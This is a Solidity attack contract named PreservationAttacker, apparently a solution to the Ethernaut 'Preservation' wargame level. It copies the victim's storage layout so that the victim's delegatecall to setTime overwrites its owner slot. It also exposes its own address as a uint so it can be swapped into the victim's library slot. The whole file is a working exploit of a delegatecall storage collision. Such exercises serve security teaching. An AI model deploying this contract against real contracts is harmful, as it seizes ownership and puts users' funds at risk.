// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract PreservationAttacker {

    address public timeZone1Library;
    address public timeZone2Library;
    uint public owner; 

    function getUintAddress() public view returns (uint256) {
      return uint256(uint160(address(this)));
    }

    function setTime(uint256 _time) public {
      owner = _time;
    }

}